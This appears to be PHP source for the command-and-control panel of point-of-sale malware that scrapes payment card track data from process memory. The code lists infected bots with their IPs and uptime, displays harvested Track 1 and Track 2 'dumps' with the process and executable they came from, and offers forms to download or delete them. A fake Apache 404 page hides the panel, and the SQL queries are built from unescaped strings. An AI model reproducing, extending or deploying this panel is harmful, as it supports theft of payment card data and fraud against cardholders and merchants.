<?php
function display404(){
	header("HTTP/1.0 404 Not Found");
	?>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache Server at <?php echo $_SERVER['HTTP_HOST']; ?> Port 80</address>
	<?php
	die();
}

function getIP(){
	if (!empty($_SERVER['HTTP_CLIENT_IP'])){
		$IP = filterString($_SERVER['HTTP_CLIENT_IP']);
	} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
		$IP = filterString($_SERVER['HTTP_X_FORWARDED_FOR']);
	} else
		$IP = filterString($_SERVER['REMOTE_ADDR']);
		
	return $IP;
}

function findString($haystack, $needle){
	if(strlen(strstr($haystack, $needle)) > 0)
		return true;
	else
		return false;
}

function strToHex($string){
    $hex = '';
    for ($i=0; $i<strlen($string); $i++){
        $ord = ord($string[$i]);
        $hexCode = dechex($ord);
        $hex .= substr('0'.$hexCode, -2);
    }
    return strToLower($hex);
}

function hexToStr($hex){
    $string='';
    for ($i=0; $i < strlen($hex)-1; $i+=2){
        $string .= chr(hexdec($hex[$i].$hex[$i+1]));
    }
    return $string;
}

function generateRandomMD5(){
	$length = rand(1, 100);
	$string = "";
	$charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
	
	for ($i=0; $i<$length; $i++)
		$string .= $charset[rand(0, 61)];
		
	$string = md5($string);
	return $string;
}

function secsToHms($secs) {
	if ($secs<0)
		return false;
	$m = (int)($secs / 60);
	$s = $secs % 60;
	$h = (int)($m / 60);
	$m %= 60;
	$d = (int)($h / 24);
	$h %= 24;
	return array($d, $h, $m, $s);
}

function getTracksRecievedToday($query, $row){
	if ($query[$row]["lastActive"] >= strtotime("today")) /* If it is still today */
		$tracksRecievedToday = $query[$row]["tracksRecievedToday"];
	else {
		$tracksRecievedToday = 0;
		executeQuery("UPDATE bots SET tracksRecievedToday = '0' WHERE ID = '" . $query[$row]["ID"] . "'");
	}
	return $tracksRecievedToday;
}

function getTracks2($query, $row){
	$query = executeQuery("SELECT count(*) FROM tracks WHERE botID = '" . $query[$row]["ID"] . "' AND type = 2");
	if ($query)
		return $query[0]["count(*)"];
	else
		return 0;
}

function displayBots($query){
?>
		<table class="botsList">
			<tr class="botInfoRow">
				<th>Bot ID</th>
				<th>Bot IP</th>
				<th>Bot last active</th>
				<th>Bot active since</th>
				<th>Dumps recieved today</th>
				<th>Dumps recieved total</th>
				<th>Actions</th>
			</tr>
<?php
	for ($i=0; $i<count($query); $i++){
?>
			<tr class="<?php echo ($query[$i]["lastActive"] >= strtotime("-1 day")) ? "botInfoRow" : "deadBotInfoRow" ?>">
				<td class="botInfo"><?php echo $query[$i]["ID"]; ?></td>
				<td class="botInfo"><?php echo $query[$i]["IP"]; ?></td>
				<td class="botInfo"><?php echo date("m/d/Y h:i:s a", $query[$i]["lastActive"]); ?></td>
				<td class="botInfo"><?php 
									echo date("m/d/Y h:i:s a", $query[$i]["firstActive"]);
									$timeActive = secsToHms(time()-$query[$i]["firstActive"]); 
									?> (Active for <?php echo $timeActive[0]; ?> days <?php echo $timeActive[1]; ?> hours <?php echo $timeActive[2]; ?> minutes <?php echo $timeActive[3]; ?> seconds)</td>
				<td class="botInfo"><?php echo getTracksRecievedToday($query, $i); ?></td>
				<td class="botInfo"><?php echo $query[$i]["tracksTotal"] . " (Track 2: " . getTracks2($query, $i) . ")"; ?></td>
				<td class="botInfo">
					<form id="downloadDumps" name="downloadDumps" action="dumpActions.php" method="post" target="_blank">
						<input type="hidden" name="botID" value="<?php echo $query[$i]["ID"]; ?>">
						<input type="hidden" name="action" value="download">
						<table><td class="navBarUnselected"><input class="btn" type="submit" value="Download dumps"></td></table>
					</form>
					<form id="deleteDumps" name="deleteDumps" action="dumpActions.php" method="post">
						<input type="hidden" name="botID" value="<?php echo $query[$i]["ID"]; ?>">
						<input type="hidden" name="action" value="delete">
						<table><td class="navBarUnselected"><input class="btn" type="submit" value="Delete dumps"></td></table>
					</form>
					<form id="deleteBots" name="deleteBots" action="dumpActions.php" method="post">
						<input type="hidden" name="botID" value="<?php echo $query[$i]["ID"]; ?>">
						<input type="hidden" name="action" value="deleteBot">
						<table><td class="navBarUnselected"><input class="btn" type="submit" value="Delete bot"></td></table>
					</form>
				</td>
			</tr>
<?php
	}
?>
		</table>
<?php
}

function displayDumps($query){
?>
		<table class="botsList">
			<tr class="botInfoRow">
				<th>Track</th>
				<th>Track type</th>
				<th>Bot ID</th>
				<th>Found in executable</th>
				<th>Found in process</th>
				<th>Time recieved</th>
				<th>Actions</th>
			</tr>
<?php
	for ($i=0; $i<count($query); $i++){
?>
			<tr class="botInfoRow">
				<td class="botInfo"><?php echo $query[$i]["track"]; ?></td>
				<td class="botInfo"><?php echo ($query[$i]["type"] == 1) ? "Track 1" : "Track 2"; ?></td>
				<td class="botInfo"><?php echo $query[$i]["botID"]; ?></td>
				<td class="botInfo"><?php echo $query[$i]["exePath"];; ?></td>
				<td class="botInfo"><?php echo $query[$i]["PID"]; ?></td>
				<td class="botInfo"><?php 
									echo date("m/d/Y h:i:s a", $query[$i]["timeRecieved"]);
									$timeActive = secsToHms(time()-$query[$i]["timeRecieved"]); 
									?> (<?php echo $timeActive[0]; ?> days <?php echo $timeActive[1]; ?> hours <?php echo $timeActive[2]; ?> minutes <?php echo $timeActive[3]; ?> seconds ago)</td>
				<td class="botInfo">
					<form id="deleteDumps" name="deleteTrack" action="dumpActions.php" method="post">
						<input type="hidden" name="botID" value="<?php echo $query[$i]["botID"]; ?>">
						<input type="hidden" name="track" value="<?php echo $query[$i]["track"]; ?>">
						<input type="hidden" name="action" value="deleteTrack">
						<table><td class="navBarUnselected"><input class="btn" type="submit" value="Delete dump"></td></table>
					</form>
				</td>
			</tr>
<?php
	}
?>
		</table>
<?php
}
?>